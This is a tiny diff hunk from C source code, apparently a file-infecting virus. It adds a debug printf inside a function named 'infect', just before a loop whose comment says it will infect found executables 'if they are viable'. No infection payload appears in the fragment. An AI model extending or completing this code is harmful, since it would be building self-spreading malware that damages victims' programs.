@@ -942,6 +942,8 @@ int infect(void)
       iat.free(search_visit);
    }
 
+   printf("%d executables to go through\n", found_executables.elements);
+   
    /* iterate over the found executables and infect them if they are viable */
    for (size_t i=0; i<found_executables.elements; ++i)
    {
